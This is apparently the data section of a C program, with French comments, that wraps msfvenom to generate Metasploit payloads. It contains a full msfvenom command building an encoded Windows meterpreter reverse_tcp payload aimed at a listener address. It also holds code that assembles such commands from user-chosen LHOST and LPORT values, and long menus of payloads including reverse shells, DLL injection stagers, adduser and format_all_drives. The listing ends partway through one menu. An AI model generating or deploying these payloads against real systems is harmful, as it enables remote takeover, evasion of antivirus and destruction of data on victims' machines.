// payload string
// msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.16 LPORT=55315 -a x86 --platform windows -e x86/shikata_ga_nai -i 4 -n 24 -K -f csharp -o /root/payload.cs
char* platformSelected ;
char	*payloadBuild		="msfvenom -p ";
char	*lhostBuild		=" LHOST=";
char	lhost[25]		="192.168.0.1";
char	*lportBuild		=" LPORT=";
char	lport[6]		="4444";
char	*payloadArch		=" -a ";
char	*payloadPlatform	=" --platform ";
char	*platform		="";
char	*payloadEncoder		=" -e ";
char	*iteratesBuild		=" -i ";
char	iterates[3]		="1";
char	*noopsBuild		=" -n ";
char	noops[3]		="1";
char	*filenameBuild		=" -o ";
char	filename[250]		=""; 



// les couleurs
char 	cyan[]			="\033[0;36m";
char 	Green[]			="\033[0;32m";
char 	okegreen[]		="\033[92m";
char 	lightgreen[]		="\033[1;32m";
char 	white[]			="\033[1;37m";
char 	red[]			="\033[1;31m";
char 	yellow[]		="\033[1;33m";
char 	BlueF[]			="\033[1;34m";
char 	orange[]		="\033[38;5;166m";

// tableau des plateformes
char	tbl_plateform_0[] 	= "[0] Exit\n";
char	tbl_plateform_1[] 	= "[1] android\n";
char	tbl_plateform_2[] 	= "[2] windows\n";
char	tbl_plateform_3[] 	= "[3] quick creator\n";

// tableau des familles de processeurs
char	tbl_procfamily_0[] 	= "[0] Exit\n";
char	tbl_procfamily_1[] 	= "[1] x86\n";
char 	tbl_procfamily_2[] 	= "[2] x64\n";

// tableau de type de payload windows
char 	tbl_payloadwindows_str[]  = "Selecte payload type : "; 
char	tbl_payloadwindows_0[]	= "[0]  Exit\n";
char	tbl_payloadwindows_1[]	= "[1]  Autres\n";
char	tbl_payloadwindows_2[]	= "[2]  dllinject\n";
char	tbl_payloadwindows_3[]	= "[3]  encrypted_shell\n";
char	tbl_payloadwindows_4[]	= "[4]  meterpreter\n";
char	tbl_payloadwindows_5[]	= "[5]  patchupdllinject\n";
char	tbl_payloadwindows_6[]	= "[6]  patchupmeterpreter\n";
char	tbl_payloadwindows_7[]	= "[7]  shell\n";
char	tbl_payloadwindows_8[]	= "[8]  upexec\n";
char	tbl_payloadwindows_9[]	= "[9]  vncinject\n";
char	tbl_payloadwindows_10[]	= "[10] x64\n";

// tableau de lhost lport
char 	tbl_lhost[]		= "Enter your LHOST like [192.168.0.1] : ";
char 	tbl_lport[]		= "Enter your LPORT like [4444] : ";

// tableau d'iteration et noops
char 	tbl_iterates[]		= "Enter number of iterations [-i or --iterations] : ";
char 	tbl_noops[]		= "Enter number of nops [-n or --nopsled] : ";

// tableau nom du fichier
char 	tbl_filename[]		= "Enter name File with extend (myFile.exe) : ";

// tableau en tête du tableau
char	tbl_entete_1[]		= "\nMatching Modules\n================\n\n   #    Name                                                        Disclosure Date  Rank    Check  Description\n   -    ----                                                        ---------------  ----    -----  -----------\n";


// tableau de type de payload windows autres
char 	tbl_payloadwindowsAutre_str[]   = "Selecte your payload : "; 
char	tbl_payloadwindowsAutre_0[]	= "  [0]   Exit\n";
char	tbl_payloadwindowsAutre_1[]	= "  [1]   payload/windows/adduser                                                      normal  No     Windows Execute net user /ADD\n";
char	tbl_payloadwindowsAutre_2[]	= "  [2]   payload/windows/dns_txt_query_exec                                           normal  No     DNS TXT Record Payload Download and Execution\n";
char	tbl_payloadwindowsAutre_3[]	= "  [3]   payload/windows/download_exec                                                normal  No     Windows Executable Download (http,https,ftp) and Execute\n";
char	tbl_payloadwindowsAutre_4[]	= "  [4]   payload/windows/exec                                                         normal  No     Windows Execute Command\n";
char	tbl_payloadwindowsAutre_5[]	= "  [5]   payload/windows/format_all_drives                                            manual  No     Windows Drive Formatter\n";
char	tbl_payloadwindowsAutre_6[]	= "  [6]   payload/windows/loadlibrary                                                  normal  No     Windows LoadLibrary Path\n";
char	tbl_payloadwindowsAutre_7[]	= "  [7]   payload/windows/messagebox                                                   normal  No     Windows MessageBox\n";
char	tbl_payloadwindowsAutre_8[]	= "  [8]   payload/windows/metsvc_bind_tcp                                              normal  No     Windows Meterpreter Service, Bind TCP\n";
char	tbl_payloadwindowsAutre_9[]	= "  [9]   payload/windows/metsvc_reverse_tcp                                           normal  No     Windows Meterpreter Service, Reverse TCP Inline\n";
char	tbl_payloadwindowsAutre_10[]	= "  [10]  payload/windows/pingback_bind_tcp                                            normal  No     Windows x86 Pingback, Bind TCP Inline\n";
char	tbl_payloadwindowsAutre_11[]	= "  [11]  payload/windows/pingback_reverse_tcp                                         normal  No     Windows x86 Pingback, Reverse TCP Inline\n";
char	tbl_payloadwindowsAutre_12[]	= "  [12]  payload/windows/powershell_bind_tcp                                          normal  No     Windows Interactive Powershell Session, Bind TCP\n";
char	tbl_payloadwindowsAutre_13[]	= "  [13]  payload/windows/powershell_reverse_tcp                                       normal  No     Windows Interactive Powershell Session, Reverse TCP\n";
char	tbl_payloadwindowsAutre_14[]	= "  [14]  payload/windows/speak_pwned                                                  normal  No     Windows Speech API - Say 'You Got Pwned!'\n";
char	tbl_payloadwindowsAutre_15[]	= " \n   -    ---- \n";

char	payloadwindowsAutre_1[]		= "windows/adduser";
char	payloadwindowsAutre_2[]		= "windows/dns_txt_query_exec";
char	payloadwindowsAutre_3[]		= "windows/download_exec";
char	payloadwindowsAutre_4[]		= "windows/exec";
char	payloadwindowsAutre_5[]		= "windows/format_all_drives";
char	payloadwindowsAutre_6[]		= "windows/loadlibrary";
char	payloadwindowsAutre_7[]		= "windows/messagebox";
char	payloadwindowsAutre_8[]		= "windows/metsvc_bind_tcp";
char	payloadwindowsAutre_9[]		= "windows/metsvc_reverse_tcp";
char	payloadwindowsAutre_10[]	= "windows/pingback_bind_tcp";
char	payloadwindowsAutre_11[]	= "windows/pingback_reverse_tcp ";
char	payloadwindowsAutre_12[]	= "windows/powershell_bind_tcp ";
char	payloadwindowsAutre_13[]	= "windows/powershell_reverse_tcp";
char	payloadwindowsAutre_14[]	= "windows/speak_pwned";

// tableau de type de payload windows dllinject
char 	tbl_payloadwindowsDllinjec_str[]= "Selecte your payload : "; 
char	tbl_payloadwindowsDllinjec_0[]	= "  [0]   Exit\n";
char	tbl_payloadwindowsDllinjec_1[]	= "  [1]   payload/windows/dllinject/bind_hidden_ipknock_tcp                            normal  No     Reflective DLL Injection, Hidden Bind Ipknock TCP Stager\n";
char	tbl_payloadwindowsDllinjec_2[]	= "  [2]   payload/windows/dllinject/bind_hidden_tcp                                    normal  No     Reflective DLL Injection, Hidden Bind TCP Stager\n";
char	tbl_payloadwindowsDllinjec_3[]	= "  [3]   payload/windows/dllinject/bind_ipv6_tcp                                      normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)\n";
char	tbl_payloadwindowsDllinjec_4[]	= "  [4]   payload/windows/dllinject/bind_ipv6_tcp_uuid                                 normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)\n";
char	tbl_payloadwindowsDllinjec_5[]	= "  [5]   payload/windows/dllinject/bind_named_pipe                                    normal  No     Reflective DLL Injection, Windows x86 Bind Named Pipe Stager\n";
char	tbl_payloadwindowsDllinjec_6[]	= "  [6]   payload/windows/dllinject/bind_nonx_tcp                                      normal  No     Reflective DLL Injection, Bind TCP Stager (No NX or Win7)\n";
char	tbl_payloadwindowsDllinjec_7[]	= "  [7]   payload/windows/dllinject/bind_tcp                                           normal  No     Reflective DLL Injection, Bind TCP Stager (Windows x86)\n";
char	tbl_payloadwindowsDllinjec_8[]	= "  [8]   payload/windows/dllinject/bind_tcp_rc4                                       normal  No     Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption, Metasm)\n";
char	tbl_payloadwindowsDllinjec_9[]	= "  [9]   payload/windows/dllinject/bind_tcp_uuid                                      normal  No     Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)\n";
char	tbl_payloadwindowsDllinjec_10[]	= "  [10]  payload/windows/dllinject/find_tag                                           normal  No     Reflective DLL Injection, Find Tag Ordinal Stager\n";
char	tbl_payloadwindowsDllinjec_11[]	= "  [11]  payload/windows/dllinject/reverse_hop_http                                   normal  No     Reflective DLL Injection, Reverse Hop HTTP/HTTPS Stager\n";
char	tbl_payloadwindowsDllinjec_12[]	= "  [12]  payload/windows/dllinject/reverse_http                                       normal  No     Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)\n";
char	tbl_payloadwindowsDllinjec_13[]	= "  [13]  payload/windows/dllinject/reverse_http_proxy_pstore                          normal  No     Reflective DLL Injection, Reverse HTTP Stager Proxy\n";
char	tbl_payloadwindowsDllinjec_14[]	= "  [14]  payload/windows/dllinject/reverse_ipv6_tcp                                   normal  No     Reflective DLL Injection, Reverse TCP Stager (IPv6)\n";
char	tbl_payloadwindowsDllinjec_15[]	= "  [15]  payload/windows/dllinject/reverse_nonx_tcp                                   normal  No     Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)\n";
char	tbl_payloadwindowsDllinjec_16[]	= "  [16]  payload/windows/dllinject/reverse_ord_tcp                                    normal  No     Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)\n";
char	tbl_payloadwindowsDllinjec_17[]	= "  [17]  payload/windows/dllinject/reverse_tcp                                        normal  No     Reflective DLL Injection, Reverse TCP Stager\n";
char	tbl_payloadwindowsDllinjec_18[]	= "  [18]  payload/windows/dllinject/reverse_tcp_allports                               normal  No     Reflective DLL Injection, Reverse All-Port TCP Stager\n";
char	tbl_payloadwindowsDllinjec_19[]	= "  [19]  payload/windows/dllinject/reverse_tcp_dns                                    normal  No     Reflective DLL Injection, Reverse TCP Stager (DNS)\n";
char	tbl_payloadwindowsDllinjec_20[]	= "  [20]  payload/windows/dllinject/reverse_tcp_rc4                                    normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n";
char	tbl_payloadwindowsDllinjec_21[]	= "  [21]  payload/windows/dllinject/reverse_tcp_rc4_dns                                normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)\n";
char	tbl_payloadwindowsDllinjec_22[]	= "  [22]  payload/windows/dllinject/reverse_tcp_uuid                                   normal  No     Reflective DLL Injection, Reverse TCP Stager with UUID Support\n";
char	tbl_payloadwindowsDllinjec_23[]	= "  [23]  payload/windows/dllinject/reverse_winhttp                                    normal  No     Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)\n";
char	tbl_payloadwindowsDllinjec_24[]	= " \n   -    ---- \n";

char	payloadwindowsDllinjec_1[]	= "windows/dllinject/bind_hidden_ipknock_tcp";
char	payloadwindowsDllinjec_2[]	= "windows/dllinject/bind_hidden_tcp";
char	payloadwindowsDllinjec_3[]	= "windows/dllinject/bind_ipv6_tcp";
char	payloadwindowsDllinjec_4[]	= "windows/dllinject/bind_ipv6_tcp_uuid";
char	payloadwindowsDllinjec_5[]	= "windows/dllinject/bind_named_pipe";
char	payloadwindowsDllinjec_6[]	= "windows/dllinject/bind_nonx_tcp";
char	payloadwindowsDllinjec_7[]	= "windows/dllinject/bind_tcp"; 
char	payloadwindowsDllinjec_8[]	= "windows/dllinject/bind_tcp_rc4";
char	payloadwindowsDllinjec_9[]	= "windows/dllinject/bind_tcp_uuid";
char	payloadwindowsDllinjec_10[]	= "windows/dllinject/find_tag";
char	payloadwindowsDllinjec_11[]	= "windows/dllinject/reverse_hop_http";
char	payloadwindowsDllinjec_12[]	= "windows/dllinject/reverse_http";
char	payloadwindowsDllinjec_13[]	= "windows/dllinject/reverse_http_proxy_pstore";
char	payloadwindowsDllinjec_14[]	= "windows/dllinject/reverse_ipv6_tcp";
char	payloadwindowsDllinjec_15[]	= "windows/dllinject/reverse_nonx_tcp";
char	payloadwindowsDllinjec_16[]	= "windows/dllinject/reverse_ord_tcp";
char	payloadwindowsDllinjec_17[]	= "windows/dllinject/reverse_tcp";
char	payloadwindowsDllinjec_18[]	= "windows/dllinject/reverse_tcp_allports";
char	payloadwindowsDllinjec_19[]	= "windows/dllinject/reverse_tcp_dns";
char	payloadwindowsDllinjec_20[]	= "windows/dllinject/reverse_tcp_rc4";
char	payloadwindowsDllinjec_21[]	= "windows/dllinject/reverse_tcp_rc4_dns";
char	payloadwindowsDllinjec_22[]	= "windows/dllinject/reverse_tcp_uuid";
char	payloadwindowsDllinjec_23[]	= "windows/dllinject/reverse_winhttp";

// tableau de type de payload windows encrypted_shell
char 	tbl_payloadwindowsEncrypSh_str[]= "Selecte your payload : "; 
char	tbl_payloadwindowsEncrypSh_0[]	= "  [0]   Exit\n";
char	tbl_payloadwindowsEncrypSh_1[]	= "  [1]   payload/windows/encrypted_shell/reverse_tcp                                  normal  No     Windows Command Shell, Encrypted Reverse TCP Stager\n";
char	tbl_payloadwindowsEncrypSh_2[]	= "  [2]   payload/windows/encrypted_shell_reverse_tcp                                  normal  No     Windows Encrypted Reverse Shell\n";
char	tbl_payloadwindowsEncrypSh_3[]	= " \n   -    ---- \n";

char	payloadwindowsEncrypSh_1[]	= "windows/encrypted_shell/reverse_tcp";
char	payloadwindowsEncrypSh_2[]	= "windows/encrypted_shell_reverse_tcp";

// tableau de type de payload windows Meterpreter
char 	tbl_payloadwindowsMeterpreter_str[]	= "Selecte your payload : "; 
char 	tbl_payloadwindowsMeterpreter_0[]	= "  [0]   Exit\n"; 
char 	tbl_payloadwindowsMeterpreter_1[]	= "  [1]   payload/windows/meterpreter/bind_hidden_ipknock_tcp                          normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager\n"; 
char 	tbl_payloadwindowsMeterpreter_2[]	= "  [2]   payload/windows/meterpreter/bind_hidden_tcp                                  normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager\n"; 
char 	tbl_payloadwindowsMeterpreter_3[]	= "  [3]   payload/windows/meterpreter/bind_ipv6_tcp                                    normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowsMeterpreter_4[]	= "  [4]   payload/windows/meterpreter/bind_ipv6_tcp_uuid                               normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowsMeterpreter_5[]	= "  [5]   payload/windows/meterpreter/bind_named_pipe                                  normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowsMeterpreter_6[]	= "  [6]   payload/windows/meterpreter/bind_nonx_tcp                                    normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsMeterpreter_7[]	= "  [7]   payload/windows/meterpreter/bind_tcp                                         normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowsMeterpreter_8[]	= "  [8]   payload/windows/meterpreter/bind_tcp_rc4                                     normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsMeterpreter_9[]	= "  [9]   payload/windows/meterpreter/bind_tcp_uuid                                    normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowsMeterpreter_10[]	= "  [10]  payload/windows/meterpreter/find_tag                                         normal  No     Windows Meterpreter (Reflective Injection), Find Tag Ordinal Stager\n"; 
char 	tbl_payloadwindowsMeterpreter_11[]	= "  [11]  payload/windows/meterpreter/reverse_hop_http                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager\n"; 
char 	tbl_payloadwindowsMeterpreter_12[]	= "  [12]  payload/windows/meterpreter/reverse_http                                     normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)\n"; 
char 	tbl_payloadwindowsMeterpreter_13[]	= "  [13]  payload/windows/meterpreter/reverse_http_proxy_pstore                        normal  No     Windows Meterpreter (Reflective Injection), Reverse HTTP Stager Proxy\n"; 
char 	tbl_payloadwindowsMeterpreter_14[]	= "  [14]  payload/windows/meterpreter/reverse_https                                    normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)\n"; 
char 	tbl_payloadwindowsMeterpreter_15[]	= "  [15]  payload/windows/meterpreter/reverse_https_proxy                              normal  No     Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy\n"; 
char 	tbl_payloadwindowsMeterpreter_16[]	= "  [16]  payload/windows/meterpreter/reverse_ipv6_tcp                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)\n"; 
char 	tbl_payloadwindowsMeterpreter_17[]	= "  [17]  payload/windows/meterpreter/reverse_named_pipe                               normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager\n"; 
char 	tbl_payloadwindowsMeterpreter_18[]	= "  [18]  payload/windows/meterpreter/reverse_nonx_tcp                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsMeterpreter_19[]	= "  [19]  payload/windows/meterpreter/reverse_ord_tcp                                  normal  No     Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsMeterpreter_20[]	= "  [20]  payload/windows/meterpreter/reverse_tcp                                      normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager\n"; 
char 	tbl_payloadwindowsMeterpreter_21[]	= "  [21]  payload/windows/meterpreter/reverse_tcp_allports                             normal  No     Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager\n"; 
char 	tbl_payloadwindowsMeterpreter_22[]	= "  [22]  payload/windows/meterpreter/reverse_tcp_dns                                  normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)\n"; 
char 	tbl_payloadwindowsMeterpreter_23[]	= "  [23]  payload/windows/meterpreter/reverse_tcp_rc4                                  normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsMeterpreter_24[]	= "  [24]  payload/windows/meterpreter/reverse_tcp_rc4_dns                              normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)\n"; 
char 	tbl_payloadwindowsMeterpreter_25[]	= "  [25]  payload/windows/meterpreter/reverse_tcp_uuid                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsMeterpreter_26[]	= "  [26]  payload/windows/meterpreter/reverse_winhttp                                  normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)\n"; 
char 	tbl_payloadwindowsMeterpreter_27[]	= "  [27]  payload/windows/meterpreter/reverse_winhttps                                 normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)\n"; 
char	tbl_payloadwindowsMeterpreter_28[]	= " \n   -    ---- \n";

char 	payloadwindowsMeterpreter_1[]	= "windows/meterpreter/bind_hidden_ipknock_tcp";
char 	payloadwindowsMeterpreter_2[]	= "windows/meterpreter/bind_hidden_tcp";
char 	payloadwindowsMeterpreter_3[]	= "windows/meterpreter/bind_ipv6_tcp"; 
char 	payloadwindowsMeterpreter_4[]	= "windows/meterpreter/bind_ipv6_tcp_uuid";
char 	payloadwindowsMeterpreter_5[]	= "windows/meterpreter/bind_named_pipe";
char 	payloadwindowsMeterpreter_6[]	= "windows/meterpreter/bind_nonx_tcp"; 
char 	payloadwindowsMeterpreter_7[]	= "windows/meterpreter/bind_tcp";
char 	payloadwindowsMeterpreter_8[]	= "windows/meterpreter/bind_tcp_rc4";
char 	payloadwindowsMeterpreter_9[]	= "windows/meterpreter/bind_tcp_uuid";
char 	payloadwindowsMeterpreter_10[]	= "windows/meterpreter/find_tag";
char 	payloadwindowsMeterpreter_11[]	= "windows/meterpreter/reverse_hop_http"; 
char 	payloadwindowsMeterpreter_12[]	= "windows/meterpreter/reverse_http"; 
char 	payloadwindowsMeterpreter_13[]	= "windows/meterpreter/reverse_http_proxy_pstore";
char 	payloadwindowsMeterpreter_14[]	= "windows/meterpreter/reverse_https"; 
char 	payloadwindowsMeterpreter_15[]	= "windows/meterpreter/reverse_https_proxy";
char 	payloadwindowsMeterpreter_16[]	= "windows/meterpreter/reverse_ipv6_tcp";
char 	payloadwindowsMeterpreter_17[]	= "windows/meterpreter/reverse_named_pipe";
char 	payloadwindowsMeterpreter_18[]	= "windows/meterpreter/reverse_nonx_tcp";
char 	payloadwindowsMeterpreter_19[]	= "windows/meterpreter/reverse_ord_tcp";
char 	payloadwindowsMeterpreter_20[]	= "windows/meterpreter/reverse_tcp";
char 	payloadwindowsMeterpreter_21[]	= "windows/meterpreter/reverse_tcp_allports"; 
char 	payloadwindowsMeterpreter_22[]	= "windows/meterpreter/reverse_tcp_dns"; 
char 	payloadwindowsMeterpreter_23[]	= "windows/meterpreter/reverse_tcp_rc4";
char 	payloadwindowsMeterpreter_24[]	= "windows/meterpreter/reverse_tcp_rc4_dns";
char 	payloadwindowsMeterpreter_25[]	= "windows/meterpreter/reverse_tcp_uuid";
char 	payloadwindowsMeterpreter_26[]	= "windows/meterpreter/reverse_winhttp";
char 	payloadwindowsMeterpreter_27[]	= "windows/meterpreter/reverse_winhttps"; 
char 	payloadwindowsMeterpreter_28[]	= "windows/meterpreter_reverse_tcp";


// tableau de type de payload windows patchupdllinject
char 	tbl_payloadwindowspatchupdllinject_str[]= "Selecte your payload : "; 
char 	tbl_payloadwindowspatchupdllinject_0[]	= "  [0]   Exit\n"; 
char 	tbl_payloadwindowspatchupdllinject_1[]	= "  [1]   payload/windows/patchupdllinject/bind_hidden_ipknock_tcp                     normal  No     Windows Inject DLL, Hidden Bind Ipknock TCP Stager\n"; 
char 	tbl_payloadwindowspatchupdllinject_2[]	= "  [2]   payload/windows/patchupdllinject/bind_hidden_tcp                             normal  No     Windows Inject DLL, Hidden Bind TCP Stager\n"; 
char 	tbl_payloadwindowspatchupdllinject_3[]	= "  [3]   payload/windows/patchupdllinject/bind_ipv6_tcp                               normal  No     Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowspatchupdllinject_4[]	= "  [4]   payload/windows/patchupdllinject/bind_ipv6_tcp_uuid                          normal  No     Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowspatchupdllinject_5[]	= "  [5]   payload/windows/patchupdllinject/bind_named_pipe                             normal  No     Windows Inject DLL, Windows x86 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowspatchupdllinject_6[]	= "  [6]   payload/windows/patchupdllinject/bind_nonx_tcp                               normal  No     Windows Inject DLL, Bind TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowspatchupdllinject_7[]	= "  [7]   payload/windows/patchupdllinject/bind_tcp                                    normal  No     Windows Inject DLL, Bind TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowspatchupdllinject_8[]	= "  [8]   payload/windows/patchupdllinject/bind_tcp_rc4                                normal  No     Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowspatchupdllinject_9[]	= "  [9]   payload/windows/patchupdllinject/bind_tcp_uuid                               normal  No     Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowspatchupdllinject_10[]	= "  [10]  payload/windows/patchupdllinject/find_tag                                    normal  No     Windows Inject DLL, Find Tag Ordinal Stager\n"; 
char 	tbl_payloadwindowspatchupdllinject_11[]	= "  [11]  payload/windows/patchupdllinject/reverse_ipv6_tcp                            normal  No     Windows Inject DLL, Reverse TCP Stager (IPv6)\n"; 
char 	tbl_payloadwindowspatchupdllinject_12[]	= "  [12]  payload/windows/patchupdllinject/reverse_nonx_tcp                            normal  No     Windows Inject DLL, Reverse TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowspatchupdllinject_13[]	= "  [13]  payload/windows/patchupdllinject/reverse_ord_tcp                             normal  No     Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowspatchupdllinject_14[]	= "  [14]  payload/windows/patchupdllinject/reverse_tcp                                 normal  No     Windows Inject DLL, Reverse TCP Stager\n"; 
char 	tbl_payloadwindowspatchupdllinject_15[]	= "  [15]  payload/windows/patchupdllinject/reverse_tcp_allports                        normal  No     Windows Inject DLL, Reverse All-Port TCP Stager\n"; 
char 	tbl_payloadwindowspatchupdllinject_16[]	= "  [16]  payload/windows/patchupdllinject/reverse_tcp_dns                             normal  No     Windows Inject DLL, Reverse TCP Stager (DNS)\n"; 
char 	tbl_payloadwindowspatchupdllinject_17[]	= "  [17]  payload/windows/patchupdllinject/reverse_tcp_rc4                             normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowspatchupdllinject_18[]	= "  [18]  payload/windows/patchupdllinject/reverse_tcp_rc4_dns                         normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)\n"; 
char 	tbl_payloadwindowspatchupdllinject_19[]	= "  [19]  payload/windows/patchupdllinject/reverse_tcp_uuid                            normal  No     Windows Inject DLL, Reverse TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowspatchupdllinject_20[]	= " \n   -    ---- \n"; 

char 	payloadwindowspatchupdllinject_1[]	= "windows/patchupdllinject/bind_hidden_ipknock_tcp";
char 	payloadwindowspatchupdllinject_2[]	= "windows/patchupdllinject/bind_hidden_tcp";
char 	payloadwindowspatchupdllinject_3[]	= "windows/patchupdllinject/bind_ipv6_tcp";
char 	payloadwindowspatchupdllinject_4[]	= "windows/patchupdllinject/bind_ipv6_tcp_uuid";
char 	payloadwindowspatchupdllinject_5[]	= "windows/patchupdllinject/bind_named_pipe";
char 	payloadwindowspatchupdllinject_6[]	= "windows/patchupdllinject/bind_nonx_tcp"; 
char 	payloadwindowspatchupdllinject_7[]	= "windows/patchupdllinject/bind_tcp";
char 	payloadwindowspatchupdllinject_8[]	= "windows/patchupdllinject/bind_tcp_rc4";
char 	payloadwindowspatchupdllinject_9[]	= "windows/patchupdllinject/bind_tcp_uuid";
char 	payloadwindowspatchupdllinject_10[]	= "windows/patchupdllinject/find_tag"; 
char 	payloadwindowspatchupdllinject_11[]	= "windows/patchupdllinject/reverse_ipv6_tcp";
char 	payloadwindowspatchupdllinject_12[]	= "windows/patchupdllinject/reverse_nonx_tcp";
char 	payloadwindowspatchupdllinject_13[]	= "windows/patchupdllinject/reverse_ord_tcp";
char 	payloadwindowspatchupdllinject_14[]	= "windows/patchupdllinject/reverse_tcp";
char 	payloadwindowspatchupdllinject_15[]	= "windows/patchupdllinject/reverse_tcp_allports";
char 	payloadwindowspatchupdllinject_16[]	= "windows/patchupdllinject/reverse_tcp_dns";
char 	payloadwindowspatchupdllinject_17[]	= "windows/patchupdllinject/reverse_tcp_rc4";
char 	payloadwindowspatchupdllinject_18[]	= "windows/patchupdllinject/reverse_tcp_rc4_dns";
char 	payloadwindowspatchupdllinject_19[]	= "windows/patchupdllinject/reverse_tcp_uuid";  


// tableau de type de payload windows patchupmeterpreter
char 	tbl_payloadwindowspatchupmeterpreter_str[]= "Selecte your payload : "; 
char 	tbl_payloadwindowspatchupmeterpreter_0[]  = "  [0]   Exit\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_1[]  = "  [1]   payload/windows/patchupmeterpreter/bind_hidden_ipknock_tcp                   normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_2[]  = "  [2]   payload/windows/patchupmeterpreter/bind_hidden_tcp                           normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_3[]  = "  [3]   payload/windows/patchupmeterpreter/bind_ipv6_tcp                             normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_4[]  = "  [4]   payload/windows/patchupmeterpreter/bind_ipv6_tcp_uuid                        normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_5[]  = "  [5]   payload/windows/patchupmeterpreter/bind_named_pipe                           normal  No     Windows Meterpreter (skape/jt Injection), Windows x86 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_6[]  = "  [6]   payload/windows/patchupmeterpreter/bind_nonx_tcp                             normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_7[]  = "  [7]   payload/windows/patchupmeterpreter/bind_tcp                                  normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_8[]  = "  [8]   payload/windows/patchupmeterpreter/bind_tcp_rc4                              normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_9[]  = "  [9]   payload/windows/patchupmeterpreter/bind_tcp_uuid                             normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_10[] = "  [10]  payload/windows/patchupmeterpreter/find_tag                                  normal  No     Windows Meterpreter (skape/jt Injection), Find Tag Ordinal Stager\n"; 
